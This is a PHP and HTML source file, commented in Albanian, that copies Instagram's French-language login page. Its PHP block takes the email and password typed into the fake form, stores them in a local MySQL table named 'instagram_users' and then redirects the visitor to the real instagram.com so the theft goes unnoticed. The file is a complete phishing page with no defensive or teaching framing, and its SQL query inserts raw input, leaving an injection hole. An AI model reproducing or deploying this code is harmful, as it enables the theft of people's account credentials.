<?php
// Vendosni informacionet për lidhjen me bazën e të dhënave
$servername = "localhost";
$username = "root"; // Ndryshoni këtu me emrin e përdoruesit tuaj të bazës së të dhënave
$password = ""; // Ndryshoni këtu me fjalëkalimin tuaj të bazës së të dhënave
$dbname = "facebook_login"; // Ndryshoni këtu me emrin e bazës së të dhënave për instagram_login

// Krijo lidhjen me bazën e të dhënave
$conn = new mysqli($servername, $username, $password, $dbname);

// Kontrolloni lidhjen
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Kontrolloni nëse forma është paraqitur dhe nëse është dërguar
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Merrni vlerat nga forma e hyrjes
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Shtoni kodin për të ruajtur të dhënat në bazën e të dhënave
    $sql = "INSERT INTO instagram_users (email, password)
    VALUES ('$email', '$password')";

    if ($conn->query($sql) === TRUE) {
        // Tani mund të drejtoni përdoruesin në faqen origjinale të hyrjes në Instagram
        header("Location: https://www.instagram.com/");
        exit();
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}

// Mbyll lidhjen me bazën e të dhënave
$conn->close();
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion • Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/png" href="image/insta.png" />
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="top">
            <div class="logo">
                <img src="image/instagram.png" alt="instagram" style="width: 175px;">
            </div>
            <div class="form">
            <form id="Login_from" method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" onsubmit="">
                <div class="input_field">
                    <input type="email" name="email" placeholder="Adresse e-mail" class="input" required>
                </div>
                <div class="input_field">
                    <input type="password" name="password" placeholder="Mot de passe" class="input" required>
                </div>
                <button class="btn" type="submit">
                    <div class="btnt" > Connexion </div>
                </button>
            </form>
            </div>
            <div class="or">
                <div class="line"></div>
                <p>OU</p>
                <div class="line"></div>
            </div>
            <div class="dif">
                <div class="fb">
                    <img src="image/facebook.png" alt="facebook">
                    <p>se connecter avec Facebook</p>
                </div>
                <div class="forgot">
                    <a href="https://www.instagram.com/accounts/password/reset/?hl=fr">Mot de passe oublié ?</a>
                </div>
            </div>
        </div>
        <div class="signup">
            <p>Vous n’avez pas de compte  ? <a href="https://www.instagram.com/accounts/emailsignup/?hl=fr">Inscrivez-vous</a></p>
        </div>
        <div class="apps">
            <p>Téléchargez l’application.</p>
            <div class="icons">
                <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="image/appstore.png" alt="appstore"></a>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD4B472C0-BE65-4C27-8627-0A374E02436F%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="image/googleplay.png" alt="googleplay"></a>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <ul>
                <li><a href="https://about.instagram.com/about-us">À PROPOS</a></li>
                <li><a href="https://help.instagram.com">AIDE</a></li>
                <li><a href="https://about.instagram.com/blog/">PRESSE</a></li>
                <li><a href="https://www.instagram.com/developer/">API</a></li>
                <li><a href="https://www.instagram.com/about/jobs/">EMPLOIS</a></li>
                <li><a href="https://help.instagram.com/519522125107875">COMFIDENTIALITÉ</a></li>
                <li><a href="https://help.instagram.com/581066165581870">CONDITIONS</a></li>
                <li><a href="https://www.instagram.com/explore/locations/">LIEUX</a></li>
                <li><a href="https://www.instagram.com/directory/profiles/">COMPTES PRINCIPAUX</a></li>
                <li><a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a></li>
                <li><a href="#">LANGUE</a></li>
            </ul>
        </div>
        <div class="copyright">
            © 2020 INSTAGRAM PAR FACEBOOK
        </div>
    </div>
</div>

</body>
</html>
